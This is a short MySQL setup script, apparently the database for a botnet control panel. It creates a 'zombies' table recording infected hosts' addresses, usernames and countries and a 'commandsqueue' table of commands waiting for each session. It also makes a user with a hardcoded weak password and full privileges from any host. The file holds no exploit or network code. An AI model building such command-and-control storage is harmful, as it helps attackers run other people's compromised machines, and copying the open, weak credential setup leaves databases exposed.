CREATE USER 'hba_user'@'%' IDENTIFIED BY 'hbaPass123';

GRANT ALL PRIVILEGES ON `hba_db`.* TO 'hba_user'@'%';

CREATE DATABASE IF NOT EXISTS hba_db;
USE hba_db;


SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";




CREATE TABLE `commandsqueue` (
                                 `id` int(11) NOT NULL,
                                 `SessionId` varchar(11) NOT NULL,
                                 `Type` varchar(10) NOT NULL,
                                 `Args` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;




CREATE TABLE `zombies` (
                           `id` int(11) NOT NULL,
                           `SessionId` varchar(10) NOT NULL,
                           `RemoteAddr` varchar(15) NOT NULL,
                           `RemotePort` varchar(6) NOT NULL,
                           `UserName` varchar(20) NOT NULL,
                           `Country` varchar(2) NOT NULL,
                           `FirstConnTime` timestamp NOT NULL DEFAULT current_timestamp(),
                           `LastConnTime` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;


ALTER TABLE `commandsqueue`
    ADD PRIMARY KEY (`id`);


ALTER TABLE `zombies`
    ADD PRIMARY KEY (`id`);


ALTER TABLE `commandsqueue`
    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;


ALTER TABLE `zombies`
    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;
COMMIT;
